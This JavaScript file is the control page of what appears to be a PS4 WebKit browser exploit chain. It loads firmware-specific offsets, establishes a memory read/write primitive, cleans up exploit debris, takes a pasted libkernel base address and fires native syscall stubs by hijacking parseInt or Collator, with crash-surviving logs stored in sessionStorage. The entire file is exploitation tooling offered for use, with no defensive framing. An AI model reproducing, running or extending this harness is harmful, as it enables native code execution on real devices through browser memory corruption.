/** stub_call.js UI — crash-safe logs survive tab death. */
import { int64 } from "./int64.js";
import { offsetsFor } from "./ps4_offsets_userland.js";
import { installWindowP, pairStatus } from "./mem.js";
import { establishPrimitive, trimExploitDebris } from "./core.js?v=stub-core-3";
import { createCrashLog } from "./log_persist.js";
import {
    fireStubSwapParseInt, fireCollatorStub, pinCollatorStub,
    STUB_LAST_STEP_KEY,
} from "./stub_call.js?v=stub-5";

const BUILD = "stub-page-5";
const params = new URLSearchParams(location.search);
let lines = [], ready = false, busy = false, collatorPin = null;
const retain = [];

const crashLog = createCrashLog({
    ssLog: "wk-stub-log",
    ssState: "wk-stub-state",
    ssBuild: "wk-stub-build",
    buildId: BUILD,
    maxLines: 120,
    flushMs: 200,
    critical: /^(FAIL|ERROR|STUB|PRIMITIVE|BOOT|SKIP|FIRE|TRIM|PIN)/,
});

function $(id) { return document.getElementById(id); }

function log(tag, d) {
    const line = tag + (d ? "  " + d : "");
    lines.push(line);
    if (lines.length > 120) lines.shift();
    crashLog.append(line, tag);
    const o = $("out");
    if (o) {
        o.textContent = lines.join("\n");
        o.scrollTop = o.scrollHeight;
    }
}

function flushLog() {
    crashLog.flushSync();
}

function state(msg, cls) {
    const s = $("state");
    if (s) { s.textContent = msg; s.className = cls || ""; }
    crashLog.persistState(msg, cls || "");
}

function parseAddr(raw) {
    if (!raw) return null;
    let s = String(raw).replace(/^0x/i, "").trim();
    if (!s || !/^[0-9a-f]+$/i.test(s)) return null;
    if (s.length <= 8) return new int64(parseInt(s, 16) >>> 0, 0);
    if (s.length < 16) s = s.padStart(16, "0");
    return new int64(parseInt(s.slice(-8), 16) >>> 0, parseInt(s.slice(0, -8), 16) >>> 0);
}

function lkFromInput() {
    const raw = $("lk-in").value.trim();
    if (!raw) {
        try {
            const s = sessionStorage.getItem("wk-libkernelBase");
            if (s) return parseAddr(s);
        } catch (_) { }
        return null;
    }
    const p = parseAddr(raw);
    if (!p) return null;
    if ((p.low & 0x3fff) === 0 && p.hi >= 0x80) return p;
    return p.sub32(0x13b20);
}

function stubMode() {
    const q = params.get("stub");
    if (q === "collator" || q === "arm" || q === "fire") return q;
    return "parseint";
}

function stubOpts() {
    return {
        log: log,
        flush: flushLog,
        stubKind: params.get("stubkind") || "syscall",
        useTextarea: params.get("arg") === "ta",
        carrier: window._wkCarrier || null,
        preTrim: function () {
            try { trimExploitDebris(); } catch (_) { }
        },
    };
}

function loadEffectiveOff() {
    const detected = offsetsFor(navigator.userAgent);
    if (!detected.off)
        throw new Error("unknown FW UA=" + (navigator.userAgent || "?").slice(0, 60));
    return detected.off;
}

function syncRadios() {
    const m = stubMode();
    document.querySelectorAll('input[name="stub"]').forEach(function (el) {
        el.checked = el.value === m;
    });
}

function showLastCrashStep() {
    try {
        const last = sessionStorage.getItem(STUB_LAST_STEP_KEY);
        if (last) log("LAST-CRASH-STEP", last);
        const prev = sessionStorage.getItem("wk-stub-log");
        if (prev) {
            lines = prev.split("\n").filter(Boolean).slice(-100);
            const o = $("out");
            if (o) o.textContent = lines.join("\n");
        }
    } catch (_) { }
}

async function runStart() {
    if (busy || ready) return;
    busy = true;
    log("BOOT", BUILD + " mode=" + stubMode());
    flushLog();
    try {
        const carrier = await establishPrimitive({
            maxAttempts: 0,
            skipTrimDebris: true,
            onEvent: (t, d) => {
                if (/PRIMITIVE|FAIL|ERROR|READ-PRIMITIVE|ATTEMPT/i.test(t)) {
                    log(t, d || "");
                    flushLog();
                }
            },
        });
        installWindowP(carrier, { promote: false });
        window._wkCarrier = carrier;
        if (!window.p) throw new Error("no window.p");
        try { trimExploitDebris(); log("TRIM", "ok"); } catch (_) { }
        if (pairStatus.state === "broken") throw new Error("pair broken");
        if (!carrier.textarea) throw new Error("no carrier.textarea");
        log("PRIMITIVE-OK", "ta=0x" + (carrier.textareaAddress || "?")
            + " nativeFn=0x" + (carrier.native && carrier.native.nativeFn || "?")
            + " exec=0x" + (carrier.native && carrier.native.executable || "?"));
        if (stubMode() === "collator") {
            collatorPin = pinCollatorStub(retain);
            log("PIN-OK", "collator arena");
        }
        ready = true;
        $("btn-fire").disabled = false;
        $("btn-arm").disabled = false;
        state("ready — Arm first, then Fire", "ok");
        flushLog();
    } catch (e) {
        log("FAIL", (e.message || String(e)) + (e.stack ? "\n" + e.stack : ""));
        state("Start failed", "bad");
        flushLog();
    } finally {
        busy = false;
    }
}

function runArm() {
    if (busy || !ready || !window.p) return;
    const lk = lkFromInput();
    if (!lk) { log("SKIP", "paste lk"); state("need lk", "bad"); flushLog(); return; }
    busy = true;
    try {
        const off = loadEffectiveOff();
        log("ARM-TAP", "lk=" + lk);
        const r = fireStubSwapParseInt(window.p, off, lk, Object.assign({}, stubOpts(), { armOnly: true }));
        log("ARM-OK", r.stubTag + " mainMf=" + r.mainMf + " — parseInt restored");
        state("arm OK — Fire uses parseInt(1)", "ok");
    } catch (e) {
        log("ARM-FAIL", e.message || String(e));
        state("arm failed", "bad");
    } finally {
        busy = false;
        flushLog();
    }
}

function runFire() {
    if (busy || !ready || !window.p) return;
    const lk = lkFromInput();
    if (!lk) { log("SKIP", "paste lk"); state("need lk", "bad"); flushLog(); return; }
    const mode = stubMode();
    busy = true;
    log("FIRE-TAP", mode + " lk=" + lk);
    flushLog();
    try {
        const p = window.p;
        const off = loadEffectiveOff();
        const opts = stubOpts();
        if (mode === "arm") {
            runArm();
            return;
        }
        if (mode === "collator") {
            if (!collatorPin) collatorPin = pinCollatorStub(retain);
            const r = fireCollatorStub(p, collatorPin, lk, off, opts);
            log("STUB-OK", r.path + " result=" + r.result);
            state("collator done", "ok");
            return;
        }
        const r = fireStubSwapParseInt(p, off, lk, opts);
        log("STUB-OK", r.stubTag + " arg=" + r.fireArg + " js=" + r.result);
        state("survived js=" + r.result, "ok");
    } catch (e) {
        log("STUB-FAIL", (e.message || String(e)) + (e.stack ? "\n" + e.stack : ""));
        state("stub failed — reload, read LAST-CRASH-STEP", "bad");
    } finally {
        busy = false;
        flushLog();
    }
}

function init() {
    crashLog.startAutoFlush();
    showLastCrashStep();
    log("INIT", BUILD + " — logs in wk-stub-log sessionStorage");
    flushLog();
    syncRadios();
    document.querySelectorAll('input[name="stub"]').forEach(function (el) {
        el.addEventListener("change", function () {
            const u = new URL(location.href);
            u.searchParams.set("stub", el.value);
            location.href = u.pathname + "?" + u.searchParams.toString();
        });
    });
    $("btn-start").onclick = runStart;
    $("btn-arm").onclick = runArm;
    $("btn-fire").onclick = runFire;
    const saved = sessionStorage.getItem("wk-libkernelBase") || sessionStorage.getItem("wk-lastFnPtr");
    if (saved) $("lk-in").value = saved;
}

init();
